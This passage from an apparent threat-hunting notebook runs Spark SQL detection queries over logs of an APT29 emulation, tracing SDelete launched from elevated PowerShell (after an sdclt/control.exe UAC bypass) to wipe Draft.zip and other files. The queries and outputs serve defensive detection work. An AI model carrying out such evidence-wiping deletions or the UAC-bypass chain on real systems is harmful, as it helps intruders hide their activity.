<span class="n">df</span><span class="o">.</span><span class="n">show</span><span class="p">(</span><span class="mi">100</span><span class="p">,</span><span class="n">truncate</span> <span class="o">=</span> <span class="kc">False</span><span class="p">,</span> <span class="n">vertical</span> <span class="o">=</span> <span class="kc">True</span><span class="p">)</span>
</pre></div>
</div>
</div>
<div class="cell_output docutils container">
<div class="output stream highlight-myst-ansi notranslate"><div class="highlight"><pre><span></span>-RECORD 0-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 Message | Registry value set:
RuleName: -
EventType: SetValue
UtcTime: 2020-05-02 03:02:04.518
ProcessGuid: {47ab858c-e2ac-5eac-cb03-000000000400}
ProcessId: 4140
Image: C:\Program Files\SysinternalsSuite\sdelete64.exe
TargetObject: HKU\S-1-5-21-1830255721-3727074217-2423397540-1107\Software\Sysinternals\SDelete\EulaAccepted
Details: DWORD (0x00000001) 
-RECORD 1-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 Message | Registry object added or deleted:
RuleName: -
EventType: CreateKey
UtcTime: 2020-05-02 03:02:04.518
ProcessGuid: {47ab858c-e2ac-5eac-cb03-000000000400}
ProcessId: 4140
Image: C:\Program Files\SysinternalsSuite\sdelete64.exe
TargetObject: HKU\S-1-5-21-1830255721-3727074217-2423397540-1107\Software\Sysinternals\SDelete                            
-RECORD 2-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 Message | Registry object added or deleted:
RuleName: -
EventType: CreateKey
UtcTime: 2020-05-02 03:02:04.518
ProcessGuid: {47ab858c-e2ac-5eac-cb03-000000000400}
ProcessId: 4140
Image: C:\Program Files\SysinternalsSuite\sdelete64.exe
TargetObject: HKU\S-1-5-21-1830255721-3727074217-2423397540-1107\Software\Sysinternals\SDelete                            
</pre></div>
</div>
</div>
</div>
<p><strong>Query ID:3A1DC1C2-B640-4FCE-A71F-2F65AB060A8C</strong></p>
<div class="cell docutils container">
<div class="cell_input docutils container">
<div class="highlight-ipython3 notranslate"><div class="highlight"><pre><span></span><span class="n">df</span> <span class="o">=</span> <span class="n">spark</span><span class="o">.</span><span class="n">sql</span><span class="p">(</span>
<span class="sd">&#39;&#39;&#39;</span>
<span class="sd">SELECT Message</span>
<span class="sd">FROM apt29Host f</span>
<span class="sd">INNER JOIN (</span>
<span class="sd">  SELECT d.NewProcessId</span>
<span class="sd">  FROM apt29Host d</span>
<span class="sd">  INNER JOIN(</span>
<span class="sd">    SELECT a.ProcessId, a.NewProcessId</span>
<span class="sd">    FROM apt29Host a</span>
<span class="sd">    INNER JOIN (</span>
<span class="sd">      SELECT NewProcessId</span>
<span class="sd">      FROM apt29Host</span>
<span class="sd">      WHERE LOWER(Channel) = &quot;security&quot;</span>
<span class="sd">          AND EventID = 4688</span>
<span class="sd">          AND LOWER(NewProcessName) LIKE &quot;%control.exe&quot;</span>
<span class="sd">          AND LOWER(ParentProcessName) LIKE &quot;%sdclt.exe&quot;</span>
<span class="sd">    ) b</span>
<span class="sd">    ON a.ProcessId = b.NewProcessId</span>
<span class="sd">    WHERE LOWER(a.Channel) = &quot;security&quot;</span>
<span class="sd">      AND a.EventID = 4688</span>
<span class="sd">      AND a.MandatoryLabel = &quot;S-1-16-12288&quot;</span>
<span class="sd">      AND a.TokenElevationType = &quot;%%1937&quot;</span>
<span class="sd">  ) c</span>
<span class="sd">  ON d.ProcessId = c.NewProcessId</span>
<span class="sd">  WHERE LOWER(d.Channel) = &quot;security&quot;</span>
<span class="sd">    AND d.EventID = 4688</span>
<span class="sd">    AND d.NewProcessName LIKE &#39;%powershell.exe&#39;</span>
<span class="sd">) e</span>
<span class="sd">ON f.ProcessId = e.NewProcessId</span>
<span class="sd">WHERE LOWER(f.Channel) = &quot;security&quot;</span>
<span class="sd">  AND f.EventID = 4688</span>
<span class="sd">  AND LOWER(f.NewProcessName) LIKE &#39;%sdelete%&#39;</span>
<span class="sd">  AND LOWER(f.CommandLine) LIKE &#39;%3aka3%&#39;</span>

<span class="sd">&#39;&#39;&#39;</span>
<span class="p">)</span>
<span class="n">df</span><span class="o">.</span><span class="n">show</span><span class="p">(</span><span class="mi">100</span><span class="p">,</span><span class="n">truncate</span> <span class="o">=</span> <span class="kc">False</span><span class="p">,</span> <span class="n">vertical</span> <span class="o">=</span> <span class="kc">True</span><span class="p">)</span>
</pre></div>
</div>
</div>
<div class="cell_output docutils container">
<div class="output stream highlight-myst-ansi notranslate"><div class="highlight"><pre><span></span>-RECORD 0---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 Message | A new process has been created.

Creator Subject:
	Security ID:		S-1-5-21-1830255721-3727074217-2423397540-1107
	Account Name:		pbeesly
	Account Domain:		DMEVALS
	Logon ID:		0x372E81

Target Subject:
	Security ID:		S-1-0-0
	Account Name:		-
	Account Domain:		-
	Logon ID:		0x0

Process Information:
	New Process ID:		0x102c
	New Process Name:	C:\Program Files\SysinternalsSuite\sdelete64.exe
	Token Elevation Type:	%%1937
	Mandatory Label:		S-1-16-12288
	Creator Process ID:	0xf24
	Creator Process Name:	C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
	Process Command Line:	&quot;C:\Program Files\SysinternalsSuite\sdelete64.exe&quot; /accepteula C:\programdata\victim\???cod.3aka3.scr

Token Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.

Type 1 is a full token with no privileges removed or groups disabled.  A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.

Type 2 is an elevated token with no privileges removed or groups disabled.  An elevated token is used when User Account Control is enabled and the user chooses to start the program using Run as administrator.  An elevated token is also used when an application is configured to always require administrative privilege or to always require maximum privilege, and the user is a member of the Administrators group.

Type 3 is a limited token with administrative privileges removed and administrative groups disabled.  The limited token is used when User Account Control is enabled, the application does not require administrative privilege, and the user does not choose to start the program using Run as administrator. 
</pre></div>
</div>
</div>
</div>
</div>
</div>
<div class="section" id="b-3-file-deletion">
<h2>4.B.3. File Deletion<a class="headerlink" href="#b-3-file-deletion" title="Permalink to this headline">¶</a></h2>
<p><strong>Procedure:</strong> Deleted Draft.zip on disk using SDelete</p>
<p><strong>Criteria:</strong> sdelete64.exe deleting the file draft.zip</p>
<div class="section" id="id24">
<h3>Detection Type:Telemetry(Correlated)<a class="headerlink" href="#id24" title="Permalink to this headline">¶</a></h3>
<p><strong>Query ID:02D0BBFB-4BDF-4167-B530-253779745EF7</strong></p>
<div class="cell docutils container">
<div class="cell_input docutils container">
<div class="highlight-ipython3 notranslate"><div class="highlight"><pre><span></span><span class="n">df</span> <span class="o">=</span> <span class="n">spark</span><span class="o">.</span><span class="n">sql</span><span class="p">(</span>
<span class="sd">&#39;&#39;&#39;</span>
<span class="sd">SELECT Message, g.CommandLine</span>
<span class="sd">FROM apt29Host h</span>
<span class="sd">INNER JOIN (</span>
<span class="sd">  SELECT f.ProcessGuid, f.CommandLine</span>
<span class="sd">  FROM apt29Host f</span>
<span class="sd">  INNER JOIN (</span>
<span class="sd">    SELECT d.ProcessId, d.ProcessGuid</span>
<span class="sd">    FROM apt29Host d</span>
<span class="sd">    INNER JOIN (</span>
<span class="sd">      SELECT a.ProcessGuid, a.ParentProcessGuid</span>
<span class="sd">      FROM apt29Host a</span>
<span class="sd">      INNER JOIN (</span>
<span class="sd">        SELECT ProcessGuid</span>
<span class="sd">        FROM apt29Host</span>
<span class="sd">        WHERE Channel = &quot;Microsoft-Windows-Sysmon/Operational&quot;</span>
<span class="sd">            AND EventID = 1</span>
<span class="sd">            AND LOWER(Image) LIKE &quot;%control.exe&quot;</span>
<span class="sd">            AND LOWER(ParentImage) LIKE &quot;%sdclt.exe&quot;</span>
<span class="sd">      ) b</span>
<span class="sd">      ON a.ParentProcessGuid = b.ProcessGuid</span>
<span class="sd">      WHERE a.Channel = &quot;Microsoft-Windows-Sysmon/Operational&quot;</span>
<span class="sd">        AND a.EventID = 1</span>
<span class="sd">        AND a.IntegrityLevel = &quot;High&quot;</span>
<span class="sd">    ) c</span>
<span class="sd">    ON d.ParentProcessGuid= c.ProcessGuid</span>
<span class="sd">    WHERE d.Channel = &quot;Microsoft-Windows-Sysmon/Operational&quot;</span>
<span class="sd">      AND d.EventID = 1</span>
<span class="sd">      AND d.Image LIKE &#39;%powershell.exe&#39;</span>
<span class="sd">  ) e</span>
<span class="sd">  ON f.ParentProcessGuid = e.ProcessGuid</span>
<span class="sd">  WHERE f.Channel = &quot;Microsoft-Windows-Sysmon/Operational&quot;</span>
<span class="sd">    AND f.EventID = 1</span>
<span class="sd">    AND LOWER(f.Image) LIKE &#39;%sdelete%&#39;</span>
<span class="sd">    AND LOWER(f.CommandLine) LIKE &#39;%draft.zip%&#39;</span>
<span class="sd">) g</span>
<span class="sd">ON h.ProcessGuid = g.ProcessGuid</span>
<span class="sd">WHERE h.Channel = &quot;Microsoft-Windows-Sysmon/Operational&quot;</span>
<span class="sd">  AND h.EventID = 23</span>

<span class="sd">&#39;&#39;&#39;</span>
<span class="p">)</span>
<span class="n">df</span><span class="o">.</span><span class="n">show</span><span class="p">(</span><span class="mi">100</span><span class="p">,</span><span class="n">truncate</span> <span class="o">=</span> <span class="kc">False</span><span class="p">,</span> <span class="n">vertical</span> <span class="o">=</span> <span class="kc">True</span><span class="p">)</span>
</pre></div>
</div>
</div>
<div class="cell_output docutils container">
<div class="output stream highlight-myst-ansi notranslate"><div class="highlight"><pre><span></span>-RECORD 0--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 Message     | File Delete:
RuleName: -
UtcTime: 2020-05-02 03:03:14.765
ProcessGuid: {47ab858c-e2f2-5eac-d203-000000000400}
ProcessId: 8760
User: DMEVALS\pbeesly
Image: C:\Program Files\SysinternalsSuite\sdelete64.exe
TargetFilename: C:\Users\pbeesly\ZZZZZZZZZZZZZZZZZZZZZ.ZZZ
Hashes: SHA1=B639091A8FA004CAA8E2D95DF4476374D7D09221,MD5=160FF0AB6AADF8ECD579C7667E4B2248,SHA256=EE85EAC531896E2203E33242A698EDB91305A6C124A98DF81F5FFF0341220150,IMPHASH=00000000000000000000000000000000
IsExecutable: false
Archived: true 
 CommandLine | &quot;C:\Program Files\SysinternalsSuite\sdelete64.exe&quot; /accepteula C:\Users\pbeesly\AppData\Roaming\Draft.Zip                                                                                                                                                                                                                                                                                                                                                                                                                       
</pre></div>
</div>
</div>
</div>
<p><strong>Query ID:719618E8-9EE7-4693-937E-1FD39228DEBC</strong></p>
<div class="cell docutils container">
<div class="cell_input docutils container">
<div class="highlight-ipython3 notranslate"><div class="highlight"><pre><span></span><span class="n">df</span> <span class="o">=</span> <span class="n">spark</span><span class="o">.</span><span class="n">sql</span><span class="p">(</span>
<span class="sd">&#39;&#39;&#39;</span>
<span class="sd">SELECT Message</span>
<span class="sd">FROM apt29Host h</span>
<span class="sd">INNER JOIN (</span>
<span class="sd">  SELECT f.ProcessGuid</span>
<span class="sd">  FROM apt29Host f</span>
<span class="sd">  INNER JOIN (</span>
<span class="sd">    SELECT d.ProcessId, d.ProcessGuid</span>
<span class="sd">    FROM apt29Host d</span>
<span class="sd">    INNER JOIN (</span>
<span class="sd">      SELECT a.ProcessGuid, a.ParentProcessGuid</span>
<span class="sd">      FROM apt29Host a</span>
<span class="sd">      INNER JOIN (</span>
<span class="sd">        SELECT ProcessGuid</span>
<span class="sd">        FROM apt29Host</span>
<span class="sd">        WHERE Channel = &quot;Microsoft-Windows-Sysmon/Operational&quot;</span>
<span class="sd">            AND EventID = 1</span>
<span class="sd">            AND LOWER(Image) LIKE &quot;%control.exe&quot;</span>
<span class="sd">            AND LOWER(ParentImage) LIKE &quot;%sdclt.exe&quot;</span>
<span class="sd">      ) b</span>
<span class="sd">      ON a.ParentProcessGuid = b.ProcessGuid</span>
<span class="sd">      WHERE a.Channel = &quot;Microsoft-Windows-Sysmon/Operational&quot;</span>
<span class="sd">        AND a.EventID = 1</span>
<span class="sd">        AND a.IntegrityLevel = &quot;High&quot;</span>
<span class="sd">    ) c</span>
<span class="sd">    ON d.ParentProcessGuid= c.ProcessGuid</span>
<span class="sd">    WHERE d.Channel = &quot;Microsoft-Windows-Sysmon/Operational&quot;</span>
<span class="sd">      AND d.EventID = 1</span>
<span class="sd">      AND d.Image LIKE &#39;%powershell.exe&#39;</span>
<span class="sd">  ) e</span>
<span class="sd">  ON f.ParentProcessGuid = e.ProcessGuid</span>
<span class="sd">  WHERE f.Channel = &quot;Microsoft-Windows-Sysmon/Operational&quot;</span>
<span class="sd">    AND f.EventID = 1</span>
<span class="sd">    AND LOWER(f.Image) LIKE &#39;%sdelete%&#39;</span>
<span class="sd">    AND LOWER(f.CommandLine) LIKE &#39;%draft.zip%&#39;</span>
<span class="sd">) g</span>
<span class="sd">ON h.ProcessGuid = g.ProcessGuid</span>
<span class="sd">WHERE h.Channel = &quot;Microsoft-Windows-Sysmon/Operational&quot;</span>
<span class="sd">  AND h.EventID in (12,13)</span>
<span class="sd">  AND LOWER(h.TargetObject) RLIKE &#39;.*\\\\\\\\software\\\\\\\\sysinternals\\\\\\\\sdelete.*&#39;</span>

<span class="sd">&#39;&#39;&#39;</span>
<span class="p">)</span>
<span class="n">df</span><span class="o">.</span><span class="n">show</span><span class="p">(</span><span class="mi">100</span><span class="p">,</span><span class="n">truncate</span> <span class="o">=</span> <span class="kc">False</span><span class="p">,</span> <span class="n">vertical</span> <span class="o">=</span> <span class="kc">True</span><span class="p">)</span>
</pre></div>
</div>
</div>
<div class="cell_output docutils container">
<div class="output stream highlight-myst-ansi notranslate"><div class="highlight"><pre><span></span>-RECORD 0-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 Message | Registry value set:
RuleName: -
EventType: SetValue
UtcTime: 2020-05-02 03:03:14.702
ProcessGuid: {47ab858c-e2f2-5eac-d203-000000000400}
ProcessId: 8760
Image: C:\Program Files\SysinternalsSuite\sdelete64.exe
TargetObject: HKU\S-1-5-21-1830255721-3727074217-2423397540-1107\Software\Sysinternals\SDelete\EulaAccepted
Details: DWORD (0x00000001) 
-RECORD 1-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 Message | Registry object added or deleted:
RuleName: -
EventType: CreateKey
UtcTime: 2020-05-02 03:03:14.702
ProcessGuid: {47ab858c-e2f2-5eac-d203-000000000400}
ProcessId: 8760
Image: C:\Program Files\SysinternalsSuite\sdelete64.exe
TargetObject: HKU\S-1-5-21-1830255721-3727074217-2423397540-1107\Software\Sysinternals\SDelete                            
-RECORD 2-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 Message | Registry object added or deleted:
RuleName: -
EventType: CreateKey
UtcTime: 2020-05-02 03:03:14.702
ProcessGuid: {47ab858c-e2f2-5eac-d203-000000000400}
ProcessId: 8760
Image: C:\Program Files\SysinternalsSuite\sdelete64.exe
TargetObject: HKU\S-1-5-21-1830255721-3727074217-2423397540-1107\Software\Sysinternals\SDelete                            
</pre></div>
</div>
</div>
</div>
<p><strong>Query ID:5A19E46B-8328-4867-81CF-87518A3784B1</strong></p>
<div class="cell docutils container">
<div class="cell_input docutils container">
<div class="highlight-ipython3 notranslate"><div class="highlight"><pre><span></span><span class="n">df</span> <span class="o">=</span> <span class="n">spark</span><span class="o">.</span><span class="n">sql</span><span class="p">(</span>
<span class="sd">&#39;&#39;&#39;</span>
<span class="sd">SELECT Message</span>
<span class="sd">FROM apt29Host f</span>
<span class="sd">INNER JOIN (</span>
<span class="sd">SELECT d.NewProcessId</span>
<span class="sd">FROM apt29Host d</span>
<span class="sd">INNER JOIN(</span>
<span class="sd">  SELECT a.ProcessId, a.NewProcessId</span>
<span class="sd">  FROM apt29Host a</span>
<span class="sd">  INNER JOIN (</span>
<span class="sd">    SELECT NewProcessId</span>
<span class="sd">    FROM apt29Host</span>
<span class="sd">    WHERE LOWER(Channel) = &quot;security&quot;</span>
<span class="sd">        AND EventID = 4688</span>
<span class="sd">        AND LOWER(NewProcessName) LIKE &quot;%control.exe&quot;</span>
<span class="sd">        AND LOWER(ParentProcessName) LIKE &quot;%sdclt.exe&quot;</span>
<span class="sd">  ) b</span>
<span class="sd">  ON a.ProcessId = b.NewProcessId</span>
<span class="sd">  WHERE LOWER(a.Channel) = &quot;security&quot;</span>
<span class="sd">    AND a.EventID = 4688</span>
<span class="sd">    AND a.MandatoryLabel = &quot;S-1-16-12288&quot;</span>
<span class="sd">    AND a.TokenElevationType = &quot;%%1937&quot;</span>
<span class="sd">) c</span>
<span class="sd">ON d.ProcessId = c.NewProcessId</span>
<span class="sd">WHERE LOWER(d.Channel) = &quot;security&quot;</span>
<span class="sd">  AND d.EventID = 4688</span>
<span class="sd">  AND d.NewProcessName LIKE &#39;%powershell.exe&#39;</span>
<span class="sd">) e</span>
<span class="sd">ON f.ProcessId = e.NewProcessId</span>
<span class="sd">WHERE LOWER(f.Channel) = &quot;security&quot;</span>
<span class="sd">AND f.EventID = 4688</span>
<span class="sd">AND LOWER(f.NewProcessName) LIKE &#39;%sdelete%&#39;</span>
<span class="sd">AND LOWER(f.CommandLine) LIKE &#39;%draft.zip&#39;</span>

<span class="sd">&#39;&#39;&#39;</span>
<span class="p">)</span>
<span class="n">df</span><span class="o">.</span><span class="n">show</span><span class="p">(</span><span class="mi">100</span><span class="p">,</span><span class="n">truncate</span> <span class="o">=</span> <span class="kc">False</span><span class="p">,</span> <span class="n">vertical</span> <span class="o">=</span> <span class="kc">True</span><span class="p">)</span>
</pre></div>
</div>
</div>
<div class="cell_output docutils container">
<div class="output stream highlight-myst-ansi notranslate"><div class="highlight"><pre><span></span>-RECORD 0-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 Message | A new process has been created.

Creator Subject:
	Security ID:		S-1-5-21-1830255721-3727074217-2423397540-1107
	Account Name:		pbeesly
	Account Domain:		DMEVALS
	Logon ID:		0x372E81

Target Subject:
	Security ID:		S-1-0-0
	Account Name:		-
	Account Domain:		-
	Logon ID:		0x0

Process Information:
	New Process ID:		0x2238
	New Process Name:	C:\Program Files\SysinternalsSuite\sdelete64.exe
	Token Elevation Type:	%%1937
	Mandatory Label:		S-1-16-12288
	Creator Process ID:	0xf24
	Creator Process Name:	C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
	Process Command Line:	&quot;C:\Program Files\SysinternalsSuite\sdelete64.exe&quot; /accepteula C:\Users\pbeesly\AppData\Roaming\Draft.Zip

Token Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.

Type 1 is a full token with no privileges removed or groups disabled.  A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.

Type 2 is an elevated token with no privileges removed or groups disabled.  An elevated token is used when User Account Control is enabled and the user chooses to start the program using Run as administrator.  An elevated token is also used when an application is configured to always require administrative privilege or to always require maximum privilege, and the user is a member of the Administrators group.

Type 3 is a limited token with administrative privileges removed and administrative groups disabled.  The limited token is used when User Account Control is enabled, the application does not require administrative privilege, and the user does not choose to start the program using Run as administrator. 
</pre></div>
</div>
</div>
</div>
</div>
</div>
<div class="section" id="b-4-file-deletion">
<h2>4.B.4. File Deletion<a class="headerlink" href="#b-4-file-deletion" title="Permalink to this headline">¶</a></h2>
<p><strong>Procedure:</strong> Deleted SysinternalsSuite.zip on disk using SDelete</p>
<p><strong>Criteria:</strong> sdelete64.exe deleting the file SysinternalsSuite.zip</p>
<div class="section" id="id25">
<h3>Detection Type:Telemetry(Correlated)<a class="headerlink" href="#id25" title="Permalink to this headline">¶</a></h3>
<p><strong>Query ID:83D62033-105A-4A02-8B75-DAB52D8D51EC</strong></p>
<div class="cell docutils container">
<div class="cell_input docutils container">
<div class="highlight-ipython3 notranslate"><div class="highlight"><pre><span></span><span class="n">df</span> <span class="o">=</span> <span class="n">spark</span><span class="o">.</span><span class="n">sql</span><span class="p">(</span>
<span class="sd">&#39;&#39;&#39;</span>
<span class="sd">SELECT Message, g.CommandLine</span>
<span class="sd">FROM apt29Host h</span>
<span class="sd">INNER JOIN (</span>
<span class="sd">  SELECT f.ProcessGuid, f.CommandLine</span>
<span class="sd">  FROM apt29Host f</span>
<span class="sd">  INNER JOIN (</span>
<span class="sd">    SELECT d.ProcessId, d.ProcessGuid</span>
<span class="sd">    FROM apt29Host d</span>
<span class="sd">    INNER JOIN (</span>
<span class="sd">      SELECT a.ProcessGuid, a.ParentProcessGuid</span>
<span class="sd">      FROM apt29Host a</span>
<span class="sd">      INNER JOIN (</span>
<span class="sd">        SELECT ProcessGuid</span>
<span class="sd">        FROM apt29Host</span>
<span class="sd">        WHERE Channel = &quot;Microsoft-Windows-Sysmon/Operational&quot;</span>
<span class="sd">            AND EventID = 1</span>
<span class="sd">            AND LOWER(Image) LIKE &quot;%control.exe&quot;</span>
<span class="sd">            AND LOWER(ParentImage) LIKE &quot;%sdclt.exe&quot;</span>
<span class="sd">      ) b</span>
<span class="sd">      ON a.ParentProcessGuid = b.ProcessGuid</span>
<span class="sd">      WHERE a.Channel = &quot;Microsoft-Windows-Sysmon/Operational&quot;</span>
<span class="sd">        AND a.EventID = 1</span>
<span class="sd">        AND a.IntegrityLevel = &quot;High&quot;</span>
<span class="sd">    ) c</span>
<span class="sd">    ON d.ParentProcessGuid= c.ProcessGuid</span>
<span class="sd">    WHERE d.Channel = &quot;Microsoft-Windows-Sysmon/Operational&quot;</span>
<span class="sd">      AND d.EventID = 1</span>
<span class="sd">      AND d.Image LIKE &#39;%powershell.exe&#39;</span>
<span class="sd">  ) e</span>
<span class="sd">  ON f.ParentProcessGuid = e.ProcessGuid</span>
<span class="sd">  WHERE f.Channel = &quot;Microsoft-Windows-Sysmon/Operational&quot;</span>
<span class="sd">    AND f.EventID = 1</span>
<span class="sd">    AND LOWER(f.Image) LIKE &#39;%sdelete%&#39;</span>
<span class="sd">    AND LOWER(f.CommandLine) LIKE &#39;%sysinternalssuite.zip%&#39;</span>
<span class="sd">) g</span>
<span class="sd">ON h.ProcessGuid = g.ProcessGuid</span>
<span class="sd">WHERE h.Channel = &quot;Microsoft-Windows-Sysmon/Operational&quot;</span>
<span class="sd">  AND h.EventID = 23</span>

<span class="sd">&#39;&#39;&#39;</span>
<span class="p">)</span>
<span class="n">df</span><span class="o">.</span><span class="n">show</span><span class="p">(</span><span class="mi">100</span><span class="p">,</span><span class="n">truncate</span> <span class="o">=</span> <span class="kc">False</span><span class="p">,</span> <span class="n">vertical</span> <span class="o">=</span> <span class="kc">True</span><span class="p">)</span>
</pre></div>
</div>
</div>
<div class="cell_output docutils container">
<div class="output stream highlight-myst-ansi notranslate"><div class="highlight"><pre><span></span>-RECORD 0--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 Message     | File Delete:
RuleName: -
UtcTime: 2020-05-02 03:03:37.794
ProcessGuid: {47ab858c-e305-5eac-d303-000000000400}
ProcessId: 8848
User: DMEVALS\pbeesly
Image: C:\Program Files\SysinternalsSuite\sdelete64.exe
TargetFilename: C:\Users\pbeesZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZ.ZZZ
Hashes: SHA1=A51DE96F19B0314067CCDD2D2A08C316367DC313,MD5=F86BF68DB45C99EDEBBB554A2091D272,SHA256=C0CE8A9099929ABF3728A9E050371EC80133EB3987A2374D9268789B50F05272,IMPHASH=00000000000000000000000000000000
IsExecutable: false
Archived: true 
 CommandLine | &quot;C:\Program Files\SysinternalsSuite\sdelete64.exe&quot; /accepteula C:\Users\pbeesly\Downloads\SysinternalsSuite.zip                                                                                                                                                                                                                                                                                                                                                                                                                       
</pre></div>
</div>
</div>
</div>
<p><strong>Query ID:AC2ECFF0-D817-4893-BDED-F16B837C4DBA</strong></p>
<div class="cell docutils container">
<div class="cell_input docutils container">
<div class="highlight-ipython3 notranslate"><div class="highlight"><pre><span></span><span class="n">df</span> <span class="o">=</span> <span class="n">spark</span><span class="o">.</span><span class="n">sql</span><span class="p">(</span>
<span class="sd">&#39;&#39;&#39;</span>
<span class="sd">SELECT Message</span>
<span class="sd">FROM apt29Host h</span>
<span class="sd">INNER JOIN (</span>
<span class="sd">  SELECT f.ProcessGuid</span>
<span class="sd">  FROM apt29Host f</span>
<span class="sd">  INNER JOIN (</span>
<span class="sd">    SELECT d.ProcessId, d.ProcessGuid</span>
<span class="sd">    FROM apt29Host d</span>
<span class="sd">    INNER JOIN (</span>
<span class="sd">      SELECT a.ProcessGuid, a.ParentProcessGuid</span>
<span class="sd">      FROM apt29Host a</span>
<span class="sd">      INNER JOIN (</span>
<span class="sd">        SELECT ProcessGuid</span>
<span class="sd">        FROM apt29Host</span>
<span class="sd">        WHERE Channel = &quot;Microsoft-Windows-Sysmon/Operational&quot;</span>
<span class="sd">            AND EventID = 1</span>
<span class="sd">            AND LOWER(Image) LIKE &quot;%control.exe&quot;</span>
<span class="sd">            AND LOWER(ParentImage) LIKE &quot;%sdclt.exe&quot;</span>
<span class="sd">      ) b</span>
<span class="sd">      ON a.ParentProcessGuid = b.ProcessGuid</span>
<span class="sd">      WHERE a.Channel = &quot;Microsoft-Windows-Sysmon/Operational&quot;</span>
<span class="sd">        AND a.EventID = 1</span>
<span class="sd">        AND a.IntegrityLevel = &quot;High&quot;</span>
<span class="sd">    ) c</span>
<span class="sd">    ON d.ParentProcessGuid= c.ProcessGuid</span>
<span class="sd">    WHERE d.Channel = &quot;Microsoft-Windows-Sysmon/Operational&quot;</span>
<span class="sd">      AND d.EventID = 1</span>
<span class="sd">      AND d.Image LIKE &#39;%powershell.exe&#39;</span>
<span class="sd">  ) e</span>
<span class="sd">  ON f.ParentProcessGuid = e.ProcessGuid</span>
<span class="sd">  WHERE f.Channel = &quot;Microsoft-Windows-Sysmon/Operational&quot;</span>
<span class="sd">    AND f.EventID = 1</span>
<span class="sd">    AND LOWER(f.Image) LIKE &#39;%sdelete%&#39;</span>
<span class="sd">    AND LOWER(f.CommandLine) LIKE &#39;%sysinternalssuite.zip%&#39;</span>
<span class="sd">) g</span>
<span class="sd">ON h.ProcessGuid = g.ProcessGuid</span>
<span class="sd">WHERE h.Channel = &quot;Microsoft-Windows-Sysmon/Operational&quot;</span>
<span class="sd">  AND h.EventID in (12,13)</span>
<span class="sd">  AND LOWER(h.TargetObject) RLIKE &#39;.*\\\\\\\\software\\\\\\\\sysinternals\\\\\\\\sdelete.*&#39;</span>

<span class="sd">&#39;&#39;&#39;</span>
<span class="p">)</span>
<span class="n">df</span><span class="o">.</span><span class="n">show</span><span class="p">(</span><span class="mi">100</span><span class="p">,</span><span class="n">truncate</span> <span class="o">=</span> <span class="kc">False</span><span class="p">,</span> <span class="n">vertical</span> <span class="o">=</span> <span class="kc">True</span><span class="p">)</span>
</pre></div>
</div>
</div>
<div class="cell_output docutils container">
<div class="output stream highlight-myst-ansi notranslate"><div class="highlight"><pre><span></span>-RECORD 0-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 Message | Registry value set:
RuleName: -
EventType: SetValue
UtcTime: 2020-05-02 03:03:33.997
ProcessGuid: {47ab858c-e305-5eac-d303-000000000400}
ProcessId: 8848
Image: C:\Program Files\SysinternalsSuite\sdelete64.exe
TargetObject: HKU\S-1-5-21-1830255721-3727074217-2423397540-1107\Software\Sysinternals\SDelete\EulaAccepted
Details: DWORD (0x00000001) 
-RECORD 1-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 Message | Registry object added or deleted:
RuleName: -
EventType: CreateKey
UtcTime: 2020-05-02 03:03:33.997
ProcessGuid: {47ab858c-e305-5eac-d303-000000000400}
ProcessId: 8848
Image: C:\Program Files\SysinternalsSuite\sdelete64.exe
TargetObject: HKU\S-1-5-21-1830255721-3727074217-2423397540-1107\Software\Sysinternals\SDelete                            
-RECORD 2-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 Message | Registry object added or deleted:
RuleName: -
EventType: CreateKey
UtcTime: 2020-05-02 03:03:33.997
ProcessGuid: {47ab858c-e305-5eac-d303-000000000400}
ProcessId: 8848
Image: C:\Program Files\SysinternalsSuite\sdelete64.exe
